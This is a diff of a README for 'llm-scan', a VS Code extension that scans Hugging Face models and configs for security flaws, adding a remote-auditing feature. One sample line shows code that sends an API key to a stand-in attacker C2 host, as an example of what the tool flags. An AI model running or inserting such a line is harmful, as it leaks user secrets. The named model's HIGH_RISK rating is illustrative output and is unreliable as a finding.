@@ -49,6 +49,13 @@ Machine learning engineers and application developers frequently load third-part
 
 ## ✨ Key Features
 
+- **🛡️ Remote Import Guardian (Real-Time Hugging Face Model Auditing):**
+  - **Inline CodeLens Badges:** Writing `AutoModelForCausalLM.from_pretrained("org/model")`, `pipeline(..., model="org/model")`, or `SentenceTransformer("org/model")` automatically renders real-time status badges above your code:
+    - Clean: `$(pass) Model Verified Clean (0/100) • org/model`
+    - Vulnerable: `$(alert) [HIGH_RISK] Risk: 45/100 • 1 Finding(s) [View Proof]`
+    - In-Flight: `$(sync~spin) Auditing Remote Model: org/model...`
+  - **Zero-Download Remote Auditing:** Inspects remote model manifests, tokenizers, configs, and chat templates over the Hugging Face API without downloading multi-gigabyte weight tensors.
+  - **In-Editor String Squiggles:** Draws error/warning underlines directly on the remote model ID string with CVE tags and 1-click Quick Fixes (`⌘.`).
 - **🔴 In-Editor Real-Time Diagnostics:** Native red and yellow squiggly underlines directly on vulnerable lines in `tokenizer.json`, `config.json`, `generation_config.json`, `chat_template.json`, and `modeling_*.py` with CWE tags and remediation hints.
 - **💡 Native In-Editor Quick Fixes (`⌘.` or Lightbulb):**
   - `💡 Security Insights: [RULE-ID]` — Instant in-editor explanation dialog with impact details and remediation instructions.
@@ -64,7 +71,20 @@ Machine learning engineers and application developers frequently load third-part
 
 ## 📸 Live Capabilities & UI Walkthrough
 
-### 1. In-Editor Squiggles & Diagnostics
+### 1. Remote Import Guardian (Real-Time Hugging Face Model Auditing)
+As soon as you type or inspect model loading statements, `llm-scan` detects the remote model repository, queries the Hugging Face Hub API weightless, and surfaces actionable CodeLens and squiggly diagnostics:
+
+```python
+# CodeLens rendered automatically above your code:
+# 🚨 [HIGH_RISK] Risk: 45/100 • 1 Finding(s) [View Proof]
+model = AutoModelForCausalLM.from_pretrained("NousResearch/Hermes-3-Llama-3.1-8B")
+#                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+# [REMOTE-RISK] Hugging Face Model 'NousResearch/Hermes-3-Llama-3.1-8B' flagged with HIGH_RISK (45/100).
+# Primary threat: [SEC-TOK-004] Control delimiter '<|im_start|>' has special=false.
+# Remediation: Set special=true for control token '<|im_start|>'.
+```
+
+### 2. In-Editor Squiggles & Diagnostics
 As you write or inspect model code and manifests, `llm-scan` flags insecure calls (such as `os.system`, `eval()`, `zlib.decompress`, or unescaped tokens) in real time:
 
 ```python
@@ -73,13 +93,13 @@ os.system("curl -s https://attacker-c2.example/beacon?key=" + api_key)
 # ^^^^^^^^^ [SEC-RCE-003] Host Command Execution via 'system' (CWE-78 / OWASP LLM03)
 ```
 
-### 2. Contextual Quick Fix Menu
+### 3. Contextual Quick Fix Menu
 Pressing **`Cmd + .`** on any highlighted vulnerability reveals one-click actions:
 * **Security Insights:** Read what the vulnerability means and how to remediate it.
 * **Generate Proof Dossier:** Validate the vulnerability deterministically.
 * **Open Documentation:** Navigate directly to the anchored rule catalog.
 
-### 3. Activity Bar Tree View
+### 4. Activity Bar Tree View
 The **LLM Model Security** tab in the Activity Bar groups findings by severity (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`) and displays the overall risk score. Clicking any entry jumps straight to the file and line number.
 
 ---
@@ -93,6 +113,8 @@ All commands are accessible via the Command Palette (**`Cmd + Shift + P`** on ma
 | `llmSecurity.scanWorkspace` | `LLM Security: Scan Workspace Models` | Audits the current workspace for model vulnerabilities. |
 | `llmSecurity.scanFile` | `LLM Security: Scan Selected Model / File` | Scans the active or right-clicked file (`.bin`, `.safetensors`, `.gguf`, `.json`, `.py`). |
 | `llmSecurity.scanRemoteHub` | `LLM Security: Audit Remote Hugging Face Repository...` | Prompts for a Hugging Face repo ID (e.g. `meta-llama/Llama-3-8B`) and scans it weightless. |
+| `llmSecurity.auditRemoteInline` | `LLM Security: Audit Remote Hugging Face Model Inline` | Triggers a remote audit directly from a detected `from_pretrained` CodeLens badge. |
+| `llmSecurity.verifySpecificModel` | `LLM Security: Generate Cryptographic Proof Dossier for Model` | Generates a deterministic Proof Dossier for a specific model ID. |
 | `llmSecurity.verifyFindings` | `LLM Security: Verify Findings (Proof Engine)` | Generates deterministic proof dossiers with cryptographic SHA-256 fingerprints. |
 | `llmSecurity.showProofDossier` | `LLM Security: View Proof Dossier Webview` | Renders the interactive HTML Proof Certificate in a new editor tab. |
 | `llmSecurity.showCompliance` | `LLM Security: Show Regulatory Framework Crosswalk` | Displays framework mappings (OWASP, MITRE ATLAS, NIST, EU AI Act). |
